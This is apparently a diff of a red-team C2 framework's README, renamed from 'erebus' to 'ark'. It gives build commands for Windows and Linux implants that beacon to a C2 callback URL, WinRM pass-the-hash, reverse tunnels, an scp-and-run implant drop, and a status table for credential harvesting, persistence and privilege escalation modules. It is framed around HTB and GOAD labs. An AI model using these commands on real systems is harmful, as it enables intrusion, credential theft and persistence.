@@ -17,18 +17,18 @@ make -C cimplant test-host
 # Prefer CA_CERT_PATH (auto DER). Fails closed if CA/ID/secret empty for HTTPS.
 make implant-c \
   CALLBACK_URL=https://<C2>:8443 \
-  CA_CERT_PATH=$HOME/.erebus/ca-cert.pem \
+  CA_CERT_PATH=$HOME/.ark/ca-cert.pem \
   SLEEP_MS=500 JITTER_PCT=10
 # → build/implant_c.exe
 
 make implant-c-linux \
   CALLBACK_URL=https://127.0.0.1:8443 \
-  CA_CERT_PATH=$HOME/.erebus/ca-cert.pem \
+  CA_CERT_PATH=$HOME/.ark/ca-cert.pem \
   SLEEP_MS=500 JITTER_PCT=10
 # → build/implant_c_linux
 ```
 
-**Beacon timing:** C implant uses **unique Unix-ms** HMAC timestamps (`erebus_unique_unix_ms`) so `SLEEP_MS=500` bursts do not collide with the server replay cache. Prefer ≥500 ms for lab; ≥1 s on flaky links.
+**Beacon timing:** C implant uses **unique Unix-ms** HMAC timestamps (`ark_unique_unix_ms`) so `SLEEP_MS=500` bursts do not collide with the server replay cache. Prefer ≥500 ms for lab; ≥1 s on flaky links.
 
 **WinRM PTH:** `ntlm_hash` = 32-hex NT or `LM:NT`. Failures return `pth_layer=<layer>` (Day-3 gate).  
 Go implant hash path: **one flow** (seal if negotiated; no seal→plain retry). Sequential `lateral winrm --hash` reuses the NTLM session (1 handshake + N commands). Live pypsrp parity still eng-verify.  
@@ -72,6 +72,8 @@ loot
 **Code status (2026-08-07):** real AS-REQ → TGS → hashcat lines; empty SPN list → empty result (no placeholders); operator-facing error strings on bind/AS fail.  
 
 **Lab status:** _fill after run_ — verified on: [ ] GOAD  [ ] HTB  
+
+**Unsupported surfaces:** Windows C reverse SOCKS over beacon is still fail-closed via `socks_api_stub.c`. Linux C hard-fails Windows-only task surfaces and AD/lateral modules with explicit operator-facing messages.  
 
 ---
 
@@ -135,7 +137,7 @@ Plan: `docs/plans/SPRINT_L_C_LINUX.md` · Sign-off: `reports/htb-c-linux-peer/SI
 # Or manual build (CA_CERT_PATH auto PEM→DER):
 make implant-c-linux \
   CALLBACK_URL=https://127.0.0.1:8443 \
-  CA_CERT_PATH=$HOME/.erebus/ca-cert.pem \
+  CA_CERT_PATH=$HOME/.ark/ca-cert.pem \
   SLEEP_MS=500
 ```
 
@@ -145,7 +147,7 @@ Many boxes (FireFlow, DarkZeroReturns) block outbound to `tun0`. Use reverse tun
 
 ```bash
 # Operator: teamserver HTTPS :8443
-erebus inbound tunnel user@TARGET_IP
+ark inbound tunnel user@TARGET_IP
 # or: ./scripts/htb_reverse_tunnel.sh user@TARGET_IP
 # Target implant must be built with CALLBACK_URL=https://127.0.0.1:8443
 scp build/implant_c_linux user@TARGET:/tmp/
@@ -167,7 +169,7 @@ ssh user@TARGET 'chmod +x /tmp/implant_c_linux && /tmp/implant_c_linux'
 
 - [ ] Build/drop **C** implant first (not Go)
 - [ ] Exercise shell + at least one of file/process/net
-- [ ] If Go used: one-line reason in report
+- [ ] Linux generate language is C (Go Linux archived)
 - [ ] Gap table for missing post-ex → Sprint L backlog
 
 ---
@@ -176,10 +178,10 @@ ssh user@TARGET 'chmod +x /tmp/implant_c_linux && /tmp/implant_c_linux'
 
 | Check | Pass? |
 |-------|-------|
-| Reverse SOCKS over beacon (`socks start`) | Code **PASS** host tests 2026-08-09; live eng open |
-| Creds MVP (`ssh_keys` / `history` / `env`) | |
-| Persist MVP (cron / systemd_user / bashrc) | |
-| Privesc `enum` (sudo/SUID/caps) | |
+| Reverse SOCKS over beacon (`socks start`) | Code **PASS**; local live **PASS** 2026-08-09 and **2026-08-18**; HTB still open |
+| Creds MVP (`ssh_keys` / `history` / `env` / `files`) | Host tests **PASS**; live eng open |
+| Persist MVP (cron / systemd_user / bashrc) | Host tests **PASS**; live eng open |
+| Privesc `enum` (sudo/SUID/caps) | Host tests **PASS**; live eng open |
 
 ---
 
